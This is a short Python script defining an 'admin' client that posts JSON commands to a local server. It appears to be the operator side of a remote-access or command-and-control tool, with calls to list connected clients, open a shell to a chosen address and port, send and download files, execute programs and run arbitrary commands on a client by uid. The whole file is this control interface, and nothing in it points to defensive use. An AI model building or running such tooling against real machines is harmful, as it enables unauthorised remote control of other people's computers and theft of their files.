#!/usr/bin/python3
import requests

class admin:
    def __init__(self,addr="http://127.0.0.1:8080/admin"):
        self.addr=addr

    def doRequest(self,json):
        try:
            r=requests.post(self.addr,json=json)
            print(r.json())
            return (r.status_code==200)
        except Exception as e:
            print("exception ocurred!",e)
            return False
        
    
    #RPCS CALLS
    def displayClients(self):
        print("[python]displaying clientes!!")
        json={"CMD":"displayClients"}
        return self.doRequest(json)
        #return True

    def abrirShell(self,uid,addr,port):
        print("[python] opening shell",uid,addr,port)
        print("displaying clientes!!")
        json={"CMD":"abrirShell","uid":uid,"port":str(port),"addr":addr}
        return self.doRequest(json)

    def sendFile(self,fname,uid=0):
        print("[python]send file ",fname,uid)
        json={"CMD":"sendFile","uid":uid,"fname":fname}
        self.doRequest(json)

    def downloadFile(self,fname,uid=0):
        print("[python]download file",fname,uid)
        json={"CMD":"downloadFile","uid":uid,"fname":fname}
        self.doRequest(json)

    def executeProgram(self,fname,uid=0):
        print("[python]executeProgram!!",fname,uid)
        json={"CMD":"executeProgram","uid":uid,"fname":fname}
        self.doRequest(json)

    def runCommand(self,cmd,uid=0):
        print("[python]run command!!",cmd,uid)
        json={"CMD":"runCommand","cmdString":cmd,"uid":uid}
        self.doRequest(json)

master=admin()